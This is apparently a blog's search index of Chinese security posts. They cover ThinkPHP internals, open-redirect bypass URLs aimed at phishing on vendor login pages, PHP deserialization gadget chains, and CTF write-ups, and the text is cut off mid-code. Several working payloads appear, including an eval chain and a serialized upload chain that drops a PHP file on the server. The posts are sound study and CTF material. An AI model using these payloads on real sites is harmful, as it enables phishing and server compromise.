<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[thinkphp框架学习]]></title>
    <url>%2F2019%2F05%2F25%2Fthinkphp3.2.3%2F</url>
    <content type="text"><![CDATA[tp3.2.3目录结构www WEB部署目录（或者子目录） ├─index.php 入口文件 ├─README.md README文件 ├─Application 应用目录 ├─Public 资源文件目录 └─ThinkPHP 框架目录 首先通过解析通过入口文件—index.php，入口文件非常简短。 &lt;?php // +---------------------------------------------------------------------- // | ThinkPHP [ WE CAN DO IT JUST THINK ] // +---------------------------------------------------------------------- // | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved. // +---------------------------------------------------------------------- // | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 ) // +---------------------------------------------------------------------- // | Author: liu21st &lt;liu21st@gmail.com&gt; // +---------------------------------------------------------------------- // 应用入口文件 // 检测PHP环境 if(version_compare(PHP_VERSION,&apos;5.3.0&apos;,&apos;&lt;&apos;)) die(&apos;require PHP &gt; 5.3.0 !&apos;); // 开启调试模式 建议开发阶段开启 部署阶段注释或者设为false define(&apos;APP_DEBUG&apos;,True); // 定义应用目录 define(&apos;APP_PATH&apos;,&apos;./Application/&apos;); // 引入ThinkPHP入口文件 require &apos;./ThinkPHP/ThinkPHP.php&apos;; // 亲^_^ 后面不需要任何代码了 就是如此简单 先检测PHP环境，然后默认开启调试模式，定义APP_PATH,然后包含ThinkPHP/ThinkPHP.php文件，重点配置在Thinkphp.php文件里 Thinkphp.php框架入口文件。 ├─ThinkPHP 框架系统目录（可以部署在非web目录下面） │ ├─Common 核心公共函数目录 │ ├─Conf 核心配置目录 │ ├─Lang 核心语言包目录 │ ├─Library 框架类库目录 │ │ ├─Think 核心Think类库包目录 │ │ ├─Behavior 行为类库目录 │ │ ├─Org Org类库包目录 │ │ ├─Vendor 第三方类库目录 │ │ ├─ ... 更多类库目录 │ ├─Mode 框架应用模式目录 │ ├─Tpl 系统模板目录 │ ├─LICENSE.txt 框架授权协议文件 │ ├─logo.png 框架LOGO文件 │ ├─README.txt 框架README文件 │ └─ThinkPHP.php 框架入口文件 defined(&apos;THINK_PATH&apos;) or define(&apos;THINK_PATH&apos;, __DIR__.&apos;/&apos;); defined(&apos;APP_PATH&apos;) or define(&apos;APP_PATH&apos;, dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]).&apos;/&apos;); defined(&apos;APP_STATUS&apos;) or define(&apos;APP_STATUS&apos;, &apos;&apos;); // 应用状态 加载对应的配置文件 defined(&apos;APP_DEBUG&apos;) or define(&apos;APP_DEBUG&apos;, false); // 是否调试模式 检查是否定义了这些变量，如果没定义则定义。 最后代码加载核心类。 // 加载核心Think类 require CORE_PATH.&apos;Think&apos;.EXT; // 应用初始化 Think\Think::start(); LIB_PATH为 当前目录加library, defined(&apos;LIB_PATH&apos;) or define(&apos;LIB_PATH&apos;, realpath(THINK_PATH.&apos;Library&apos;).&apos;/&apos;); // 系统核心类库目录 CORE_PATH为 defined(&apos;CORE_PATH&apos;) or define(&apos;CORE_PATH&apos;, LIB_PATH.&apos;Think/&apos;); // Think类库目录 学不会，cnm，真难，卒！ 参考：官方手册]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透之url跳转]]></title>
    <url>%2F2019%2F05%2F17%2Furl%E8%B7%B3%E8%BD%AC%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[前言最近在一些厂商项目中开始接触到一些url任意重定向，虽然是低危，奖金较低，（虽然国外已经是几百$）但是一旦找到突破点，几乎整个站的url跳转都可以bypass，一个厂商所有点的url跳转加起来奖金也比较可观，所以将自己挖掘过程中一点点心得分享一下。 简介先走个流程说些废话，url重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼，浅析危害。 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form method=&quot;get&quot; action=&quot;url.php&quot;&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;&lt;br&gt; password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; name=&quot;password&quot;&gt; &lt;/form&gt; &lt;?php $url=$_GET[&apos;redict&apos;]; echo $_GET[&apos;username&apos;]; if ($_GET[&apos;username&apos;]&amp;&amp;$_GET[&apos;password&apos;]) { header(&quot;Location:$url&quot;);exit; } ?&gt; 最简单的代码实例，也是很贴近真实渗透的案例，登陆跳转，后面通常是加上自己业务的url，一旦存在url任意重定向，发送给用户，会毫不疑问的输入账号密码登陆，然后跳转到我们想要他跳转的url，比如： 我们发送给用户这样的url， http://127.0.0.1/url.php?username=&amp;password=&amp;redict=http://127.0.0.1/fish.php 用户正常输入账号密码登陆点击登陆。跳转到构造的页面。(我可真是个钓鱼鬼才) 当然钓鱼界面可以伪造一切你想获取的信息。 bypass其实bypass没什么新的套路(我暂时没)，都是网上有的，师傅们可以百度到的，我整理一下，利用上面的代码简单测试，都是本地测试通过的。www.xiaozhupeiqi.com是服务器要求跳转的url。 1.最常用的一条：@绕过。 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.xiaozhupeiqi.com@www.baidu.com //ssrf也可用 2.绕过一些匹配特定字符。 ？绕过 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com?www.xiaozhupeiqi.com #绕过 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com#www.xiaozhupeiqi.com 3.斜杠/绕过 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com/www.xiaozhupeiqi.com 或者反斜线 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com\www.xiaozhupeiqi.com 4.白名单匹配绕过 比如匹配规则是必须跳转，xiaozhupeiqi.com 域名下，?#等都不行的时候，如果匹配规则为xiaozhupeiqi.com，可以尝试百度inurl:xiaozhupeiqi.com的域名，比如 aaaxiaozhupeiqi.com，这样同样可以绕过。接下来实战中会用到， 5.xip.io绕过 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.xiaozhupeiqi.com.220.181.57.217.xip.io 会跳转到百度 6.理想化方法 如果有机会在自己的页面设置url跳转，比如目标网站的bbs论坛自己的资料页面设置url跳转，既然是服务器的网站，那么url是不会限制的，可以用一个漏洞去构造另一个漏洞。 7.白名单网站可信 如果url跳转点信任百度url，google url或者其他，则可以多次跳转达到自己的恶意界面。 8.协议绕过 http与https协议转换尝试，或者省略 http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=//www.xiaozhupeiqi.com@www.baidu.com http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=////www.xiaozhupeiqi.com@www.baidu.com//多斜线 9.xss跳转 这种就没啥说的了，就是XSS造成的跳转，下面也有案例，在有些情况下XSS只能造成跳转的危害。 &lt;meta content=&quot;1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh&quot;&gt; fuzz几个参数redirect url redirectUrl callback return_url toUrl ReturnUrl fromUrl redUrl request redirect_to redirect_url jump jump_to target to link linkto domain 实战几个案例1.最常见的登陆跳转 登陆跳转我认为是最常见的跳转类型，几乎百分之七八十网站都会url里设置跳转，所以在登陆的时候建议多观察url参数，通常都会存在跳转至于存不存在漏洞需要自己测试。 上面的类型四, 漏洞url ： https://xx.xxx.com/User/Login?redirect=http://xxx.com/ 为登陆页面，如果登陆成功那么跳转http://xxx.com/，但是所有方式都无法绕过，但是发现可以跳转aaxxx.com，也就是匹配规则为必须为xxx.com的网址，但是aaxxx.com同样也可以。 方法： 百度 inurl:xxx.com，即可百度到很多域名包含xxx.com的url，即可实现跳转,不小心百度到一个黄域，正好证明危害登陆跳XX网。 还有一些花里胡哨的base64加码了的跳转，解码就是需要跳转的url,其实本质都一样， 2.@绕过 @是最常见的一种绕过。 漏洞url https://xx.xxx.com/user/goToLogin?toUrl=https://xx.xxx.com@www.baidu.com 这种跳转在chrome浏览器可以直接跳转，但是在火狐会弹框询问，但是并不影响它的危害。 火狐下@的跳转。 还有一些是跳转目录的， 如： https://xx.xxx.com.cn/?redirect=/user/info.php 修改为 https://xx.xxx.com.cn/?redirect=@www.baidu.com 这种情况通常@也可以跳转，大胆的去尝试 3.充值接口跳转 通常充值接口都会进行跳转，如充值成功会跳转到充值前访问的页面，因为充值接口需要充值才能知道到底存不存在漏洞，所以测试的人相对少一些，大胆去尝试，单车变摩托，充值完成后还可以提现其实并不影响，不嫌麻烦就多测测。这些都是跳转成功的案例。 4.xss造成的url跳转 在一次渗透测试中，碰到一个站点，对&lt;&gt;”这些字符都是进行了过滤。且没有其他姿势配合，基本上告别了XSS等漏洞。如下 可以发现我输入了xsstest&lt;&gt;”，但是&lt;&gt;被直接删除过滤掉了，但是发现双引号还在，先看下源码是怎么处理的。 乍一看双引号也被转义了，输入的xsstest 搜索有十七处，大部分被实体化了，还有一部分双引号被url编码了，但是此时突然发现我箭头指的一处并未对双引号进行转义或者过滤，虽然&lt;&gt;已经完全被过滤掉了。 此时构造meta的url跳转。 payload： http://xxx.com/search?w=1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh&amp;fsearch=yes 其中输入 1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh 最终闭合掉得到的源码为。 最终点击payload会跳转百度页面，其实这个严格意义上来说算XSS造成的跳转，构造应该也可以XSS。 5.业务完成后跳转 这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。 通常这个点都会存在跳转至于存不存在任意跳转，师傅们自测,有些跳转业务不好码就不发了。 6.用户交互 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。 问卷调查提交跳转。 ps:如果有其他小技巧我会更新到本篇文章。 参考：https://www.anquanke.com/post/id/94377?from=singlemessage]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化学习]]></title>
    <url>%2F2019%2F04%2F20%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[PHP序列化浅析首先简单了解下PHP 序列化函数，PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。 PHP代码实例。 序列化格式。 &lt;?php class CB { public $CB_data = &apos;cb&apos;; } class test extends CB { public $data; public $pass; const SECOND = 60;//常量值 public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } } $number = 66; $str = &apos;String&apos;; $bool = true; $null = NULL; $arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2); $cc = new test(&apos;peiqi&apos;, true); $a=serialize($cc); echo $a; echo unserialize($a); echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($number));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($str));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($bool));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($null));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;; var_dump(serialize($cc)); ?&gt; 打印出来 string(5) &quot;i:66;&quot; string(13) &quot;s:6:&quot;String&quot;;&quot; string(4) &quot;b:1;&quot; string(2) &quot;N;&quot; string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; string(76) &quot;O:4:&quot;test&quot;:3:{s:4:&quot;data&quot;;s:5:&quot;peiqi&quot;;s:4:&quot;pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot;//注意私有变量和共有变量区别，继承的变量可以序列化保存，但是常量不会保存。 为什么要用序列化序列化是将变量转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。 假设有个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了，也正是这个特性使得存在了PHP反序列化漏洞。 序列化漏洞要了解PHP反序列化漏洞至关重要的是利用魔术方法，产生序列化漏洞往往是控制了参数，调用了魔术方法，然后造成漏洞。魔法函数一般是以__开头，通常会因为某些条件而触发不用我们手动调用。 魔术方法1.__construct，__destruct __construct构建对象的时被调用； __destruct明确销毁对象或脚本结束时被调用； 2.__get，__set __set当给不可访问或不存在属性赋值时被调用 __get读取不可访问或不存在属性时被调用 3.__isset，__unset __isset对不可访问或不存在的属性调用isset()或empty()时被调用 __unset对不可访问或不存在的属性进行unset时被调用 4.__call，__callStatic __call调用不可访问或不存在的方法时被调用 __callStatic调用不可访问或不存在的静态方法时被调用 5.__sleep，__wakeup __sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 __wakeup当使用unserialize时被调用，可用于做些对象的初始化操作 6.__clone 进行对象clone时被调用，用来调整对象的克隆行为 7.__toString 当一个类被转换成字符串时被调用 8.__invoke 当以函数方式调用对象时被调用 9.__set_state 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 10.__debuginfo 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 举例： &lt;?php class A{ var $test = &quot;test&quot;; function __destruct(){ echo $this-&gt;test; } } $a = $_GET[&apos;test&apos;]; $a_unser = unserialize($a); ?&gt; 构造反序列化poc，然后触发魔术方法__destruct()（明确销毁对象或脚本结束时被调用）, 正常输出应该为test。 通过代码构造poc &lt;? class A{ var $test = &quot;test&quot;; function __destruct(){ echo $this-&gt;test; } } $c= new A(); $c-&gt;test=&quot;123456&quot;; echo serialize($c); echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;; ?&gt; 获得 O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:6:&quot;123456&quot;;} 最终可以任意控制输出结果。 一些魔术方法的作用。 &lt;?php class test{ public $abc=123; var $test = &apos;123&apos;; function __wakeup(){ echo &quot;__wakeup&quot;; echo &quot;&lt;/br&gt;&quot;; } function __construct($filename = &apos;&apos;){ $this -&gt; abc = $filename; echo &quot;__construct&quot;; echo &quot;&lt;/br&gt;&quot;; } function __destruct(){ echo &quot;__destruct&quot;; echo &quot;&lt;/br&gt;&quot;; } function abc() { echo $this -&gt; abc ; } } $class2 = &apos;O:4:&quot;test&quot;:2:{s:3:&quot;abc&quot;;s:12:&quot;xiaozhupeiqi&quot;;s:4:&quot;test&quot;;s:3:&quot;123&quot;;}&apos;; $class2_unser = unserialize($class2); echo $class2_unser -&gt;abc(); echo &quot;&lt;/br&gt;&quot;; ?&gt; 结果。 相同的函数名，构造利用。 &lt;?php class test { var $test1; function __construct() { $this-&gt;test = new xzpq(); } function __destruct() { $this-&gt;test-&gt;func(); } } class xzpq { function func() { echo &quot;serialize test&quot;; } } class xzpq1 { var $test2; function func() { eval($this-&gt;test2); } } $class = new test(); unserialize($_GET[&apos;test&apos;]); ?&gt; 正常链是new test()对象，然后魔术方法调用 $this-&gt;test = new xzpq(); 然后下一个魔术方法调用func()函数最终输出serialize test 利用:利用反序列化触发第一个魔术方法，覆盖使其new xzpq1方法，然后自动调用第二个func，在构造poc里传入test2值达到任意代码执行漏洞。 class test { var $test1; function __construct() { $this-&gt;test = new xzpq1(); } function __destruct() { $this-&gt;test-&gt;func(); } } class xzpq { function func() { echo &quot;serialize test&quot;; } } class xzpq1 { var $test2=&quot;phpinfo();&quot;; function func() { eval($this-&gt;test2); } } $class = new test(); echo serialize($class); 实战CTF-web难度0.1 url:http://web.jarvisoj.com:32768/index.php 比较简单，读取源码，这就不说了自己去读，然后这是三个文件源码。 shield.php &lt;?php //flag is in pctf.php class Shield { public $file; function __construct($filename = &apos;&apos;) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); } } } ?&gt; index.php &lt;?php require_once(&apos;shield.php&apos;); $x = new Shield(); isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;]; if (!empty($g)) { $x = unserialize($g); } echo $x-&gt;readfile(); ?&gt; &lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt; showimg.php &lt;?php $f = $_GET[&apos;img&apos;]; if (!empty($f)) { $f = base64_decode($f); if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE &amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) { readfile($f); } else { echo &quot;File not found!&quot;; } } ?&gt; 流程解析： 很明显需要index.php 与 shield.php 结合，传入class反序列化串，传入完成后触发__construct 方法，来传入file值，然后利用 function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); } 来读取源码。 构造poc： &lt;?php class Shield { public $file; function __construct($filename = ‘’) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) { return @file_get_contents($this-&gt;file); } } } $a=new shield(); $a-&gt;file=&quot;pctf.php&quot;; echo serialize($a); ?&gt; web1题目打开： 右键查看源码， 发现是文件包含，并且有提示hint.php。 使用php://filter/read=convert.base64-encode/resource=index.php ，分别读出index.php和hint.php源码。 index.php &lt;html&gt; &lt;?php error_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;]; if(!isset($file)){ echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;; } if(preg_match(&quot;/flag/&quot;,$file)){ die(&apos;hack attacked!!!&apos;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); foreach($query as $value){ if (preg_match(&quot;/flag/&quot;,$value)) { die(&apos;stop hacking!&apos;); exit(); } } $payload = unserialize($payload); }else{ echo &quot;Missing parameters&quot;; } ?&gt; &lt;!--Please test index.php?file=xxx.php --&gt; &lt;!--Please get the source of hint.php--&gt; &lt;/html&gt; hint.php &lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\n&quot;; } public function __construct($handle) { echo 123; $this-&gt;handle = $handle; } public function __destruct(){ echo 456; $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ echo &quot;666&quot;; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } } } ?&gt; index.php中可以传参两个参数，并且有明显的反序列化函数unserialize，应该是反序列化漏洞，在首先file包含hint.php才能调用class读取flag.php。但是无法读取flag.php，有明显的正则拦截。 parse_str($url[&apos;query&apos;],$query); foreach($query as $value){ 将当前赋值给网站参数值赋值给value，使用双斜线使得$url[‘query’]无效，绕过第二个过滤。 反序列化解析： 传入payload会被反序列化，传入特定序列化参数，实例化Handle类，传入$handle参数实例化class Flag，在Handle类里销毁时调用魔法函数function __destruct()调用$this-&gt;handle-&gt;getFlag();来执行flag函数，Flag类需要传入file参数，这里传入flag.php代码，从而读取flag.php的源码获得flag。 在hint.php 生成序列化payload。加入以下代码 #$a = new Flag(&apos;./flag.php&apos;); #$test = new Handle($a); #echo serialize($test); 其中handle是private所以需要改成%00Handle%00handle，双//绕过value拦截flag字段。最终payload，反序列化的时候会调用wakeup方法，绕过方式。 wakeup方法(CVE-2016-7124) O:6:&quot;sercet&quot;:1: 也就是输入比1大的值就行 如O:6:&quot;sercet&quot;:2: 最终payload http://604abe9ee70d4acab8aea61f547235a56c60f822bc734cf3.changame.ichunqiu.com//index.php?file=hint.php&amp;payload=O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:10:%22./flag.php%22;s:5:%22token%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;s:10:%22token_flag%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;}} 直接访问请求即可脚本跑出md5，按概率学来说一万个就能百分百跑出来。相等即可获得flag。 强网杯–upload访问 www.tar.gz 下载源码。 四个核心文件，上传发现是上传之后全部重新命名，服务器命名后缀无法绕过，但是有序列化函数，推断很可能是反序列化漏洞。 发现profile文件里的call魔术方法。 public function __call($name, $arguments) { if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); } } 利用这一行$this-&gt;{$this-&gt;{$name}}($arguments); 如果可以控制name以及arguments值，那么就可以调用任意方法了。 发现upload中有可以利用的点。@copy($this-&gt;filename_tmp, $this-&gt;filename);，如果这后面的参数可控，那么我么就可以任意控制命名。就可以上传PHP文件，那么就需要绕过这个点。 if(!empty($_FILES)){ $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;; $this-&gt;ext_check(); } 那么本题就是绕过empty检测，然后利用魔术方法调用upload_img进行上传。 那么下一步寻找反序列化点，发现会将我们的cookie反序列化 if(!empty($profile)){ $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){ return 1; }else{ return 0; } } 要进入call魔术方法需要条件。当调用类中不存在的方法时，就会调用__call(); 如我们控制反序列化字符串，使之反序列化Register类，控制$this-&gt;checker为Profile类，就可以对Profile类调用index()方法，而在Profile类中不存在此方法，就会进入__call方法，然后call方法直接调用 upload_img() 函数，从而上传。但是 代码一：$this-&gt;checker-&gt;index(); 代码二：$this-&gt;{$this-&gt;{$name}}($arguments); 这里调用的是Profile-&gt;index(),无法控制，所以此时需要寻找可以调用可控的方法，因为index()方法不存在，所以调用魔术方法 public function __get($name) //如果调用的变量属性不存在，反序列化就会默认调用__get()方法，$name是属性名 { return $this-&gt;except[$name]; } 然后传入可控变量$this-&gt;except[$name]; 然后传入upload_img，最终调用upload_img函数，然后在覆盖变量， $pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;; $pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;; 然后就能最终上传上去php文件。 payload: &lt;?php namespace app\web\controller; class Profile{ public $ext; public $filename_tmp; public $filename; public $except; } class Register{ public $checker; public $registed; } $reg = new Register(); $pro = new Profile(); $pro-&gt;except = array(&apos;index&apos;=&gt;&apos;upload_img&apos;); $pro-&gt;ext = 1; $pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;; $pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;; $reg-&gt;checker = $pro; $reg-&gt;registed = 0; echo base64_encode(serialize($reg)); ?&gt; 收藏文章：https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ 参考：https://www.cnblogs.com/youyoui/p/8610068.html参考：https://www.freebuf.com/articles/web/167721.html]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019DDCTF]]></title>
    <url>%2F2019%2F04%2F14%2F2019DDCTF%2F</url>
    <content type="text"><![CDATA[滴 进入题目，观察url http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 比较明显应该是base64编码了。 两次base64解码。 666C61672E6A7067 应该为16进制，直接十六进制转化字符串。 只要文件存在应该就可以读取文件，dirsearch扫描目录。 尝试读取index.php文件，查看源码。发现base64的 data数据流。 解码base64得到源码。 &lt;?php /* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */ error_reporting(E_ALL || ~E_NOTICE); header(&apos;content-type:text/html;charset=utf-8&apos;); if(! isset($_GET[&apos;jpg&apos;])) header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;); $file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;]))); echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); echo $file.&apos;&lt;/br&gt;&apos;; $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file); echo $file.&apos;&lt;/br&gt;&apos;; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;; /* * Can you find the flag file? * */ ?&gt; 正则绕了半天，发现绕不过去，此时上面有个注释一篇文章，应该是有根据出现的。这个题确实坑，出的没啥意义，最后发现和这篇文章没啥关系，还有一行注释Date: July 4,2018，找到这一天日期的文章。 文中多次圈了practice.txt.swp文件，查看这个文件。 得到了新的提示，查看这个文件的源码，但是上文正则不允许出现！，相应的下面给了提示，config会自动替换成！， f1ag!ddctf.php 构造 f1agconfigddctf.php在进行16进制两次base64编码，得到base64的源码为： &lt;?php include(&apos;config.php&apos;); $k = &apos;hello&apos;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&apos;hello&apos;; } } ?&gt; 变量覆盖掉原来的content，置为空得到flag。 web签到题目 抓包，发现存在第二个包，第一个提示没有权限，尝试填写admin管理员，成功返回php目录提示。 打开app//fL2XID2i0Cdh.php 文件获得源码。 url:app/Application.php Class Application { var $path = &apos;&apos;; public function response($data, $errMsg = &apos;success&apos;) { $ret = [&apos;errMsg&apos; =&gt; $errMsg, &apos;data&apos; =&gt; $data]; $ret = json_encode($ret); header(&apos;Content-type: application/json&apos;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &apos;admin&apos;; if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) { $this-&gt;response(&apos;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&apos;); return TRUE; }else{ $this-&gt;response(&apos;抱歉，您没有登陆权限，请获取权限后访问-----&apos;,&apos;error&apos;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(&apos;../&apos;,&apos;&apos;,$path); $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;); } exit(); } } url:app/Session.php include &apos;Application.php&apos;; class Session extends Application { //key建议为8位字符串 var $eancrykey = &apos;&apos;; var $cookie_expiration = 7200; var $cookie_name = &apos;ddctf_id&apos;; var $cookie_path = &apos;&apos;; var $cookie_domain = &apos;&apos;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &apos;DiDI Welcome you %s&apos;; $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]); parent::response($data,&apos;sucess&apos;); }else{ $this-&gt;session_create(); $data = &apos;DiDI Welcome you&apos;; parent::response($data,&apos;sucess&apos;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&apos;../config/key.txt&apos;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&apos;error&apos;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); 